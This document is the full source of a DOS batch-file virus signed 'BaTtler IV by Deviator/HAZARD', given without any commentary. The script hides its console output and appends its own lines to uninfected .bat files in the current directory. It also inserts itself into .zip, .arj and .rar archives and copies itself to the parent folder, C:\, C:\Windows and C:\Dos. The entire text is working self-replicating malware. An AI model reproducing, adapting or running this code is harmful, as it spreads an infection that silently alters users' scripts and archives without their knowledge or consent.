
@Ctty Nul %Hz%
If $%1 == $Hzi Goto Hzi
If $%1 == $HzZ Goto HzZ
If $%1 == $HzA Goto HzA
If $%1 == $HzR Goto HzR
Find "Hz"<%0>CoolHz.Bat
For %%t in (*.bat) do Call %0 Hzi %%t
For %%t in (*.zip) do Call %0 HzZ %%t
For %%t in (*.arj) do Call %0 HzA %%t
For %%t in (*.rar) do Call %0 HzR %%t
Copy CoolHz.Bat ..
Copy CoolHz.Bat C:\
Copy CoolHz.Bat C:\Windows
Copy CoolHz.Bat C:\Dos
Del CoolHz.Bat
Goto HzQ
:Hzi
Find "Hz"<%2
If %2 == AUTOEXEC.BAT Goto HzN
If Not ErrorLevel 1 Goto HzN
Type CoolHz.Bat>>%2
Goto HzN
:HzZ
Pkzip %2 CoolHz.Bat
Goto HzN
:HzR
Rar a -std %2 CoolHz.Bat
Goto HzN
:HzA
Arj a %2 CoolHz.Bat
Goto HzN
:HzQ
Ctty Con %Hz%
:HzN BaTtler IV by Deviator/HAZARD.
